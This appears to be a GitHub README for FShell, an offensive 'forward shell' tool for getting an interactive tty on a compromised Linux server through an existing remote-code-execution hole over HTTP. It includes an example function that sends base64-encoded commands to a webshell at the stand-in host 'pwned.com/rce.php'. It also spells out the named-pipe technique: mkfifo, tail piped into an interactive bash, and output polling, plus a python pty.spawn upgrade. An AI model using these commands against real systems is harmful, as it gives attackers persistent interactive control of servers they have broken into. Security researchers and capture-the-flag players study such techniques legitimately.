# **FShell**

## Description
FShell is my implementation of a Forward Shell. It's designed to get an interactive tty using remote code execution through a stageless protocol (eg HTTP).

## Why I should use a forward shell ?
- The remote server is not able to reach internet, no reverse shell possibility
- I don't want the server initiate new outgoing connection or expose new service (only use vulnerable exposed service)

However, it also have disadvantage
- Many requests per second (in case of a web server, it will generate many access log)
- Not fully interactive: no auto-completion (this theoretically could be implemented but that will generate huge amount of requests), remember that your input is send to the python script then to the remote server.

The requests frequency can be changed modifying ```BEACONING_DELAY``` variable.

## Requirements
### On attacker machine

Python3 & lib:
- requests
- termcolor

### On the target
Only Linux is supported at this time and required basic commands/tools on the remote system:
- python2 (and pty module)
- bash
- mkfifo
- cat
- tail
- ps
- grep
- awk
- kill


## Usage
Modify the ```WRITABLE_FOLDER``` variable if /tmp is not available for write or if you have something better (prefer /dev/shm)

You **must** redefine ```execute``` function to perform your remote code execution:

```python
def execute(cmd, verbose=False, timeout=None):
    """
    :cmd      Raw shell command to execute on the remote system
    :timetout MANDATORY: Used to kill blocking execution loop (used in named pipe creation).
              If you cannot, put named pipe creation in separated thread
    :verbose  Print full cmd executed on the remote system (Debug mode)
    """
    # Put your RCE code here
    r = requests.get('http://pwned.com/rce.php?cmd=%s' % (b64encode(cmd)), timeout=timeout)
    return r.text.strip() # You can apply formating if the output is not only the output of command
```
### Commands
- **help_shell**: Print commands help
- **get_sessid**: Print current session id on the remote server
- **upgrade_shell**: Start remote pty using python to create interactive shell
- **exit_shell**: Clear 'properly' the remote shell. If you're connected with another user than the first, please exit normally before.

### Demo

![FShell Demo](https://github.com/Hypnoze57/FShell/blob/master/demo.gif)


## How it's working
The concepts are pretty simple.

First you need to create a named pipe on the remote system.
It will be used to send command to the shell <br>
```mkfifo /tmp/input```.

Then, create a bash loop that reading the named pipe constantly and send it to an interactive bash process that sending stdin & stderr to an output file. <br>
```tail -f /tmp/input | /bin/bash -i > /tmp/output 2>&1 ```

[Reading named pipe] -> [Execute named pipe content] -> [Send stdin/stderr into output file] -> [Go to reading named pipe because of '-f' tail option]

Next part is to start a python thread that performing ```cat /tmp/output``` regularly to get the shell output. <br/>
If the thread find data, it will clear the output file content using ```echo '' > /tmp/output```
<br>*Tips: In order to avoid error logging for a non-existing file, the script execute 'id' command before starting the 'GetOutput' thread to create the output file.*

One of the last step is to get user input from our python script and send it to the named pipe<br>```echo USERCMD > /tmp/input```

And the **final trick** to back a remote interactive **tty** is the 'upgrade_shell' command.
This command perform a ```python -c 'import pty;pty.spawn("/bin/bash")'``` (and some export and aliases) to spawn a real tty for the current process (used in named pipe loop)


## Thanks

Thanks to [@ippsec](https://twitter.com/ippsec), I didn't knowing that something like this was possible before watching this videos [Stratosphere HTB Write Up](https://www.youtube.com/watch?v=uMwcJQcUnmY) !

Hope you enjoy it!
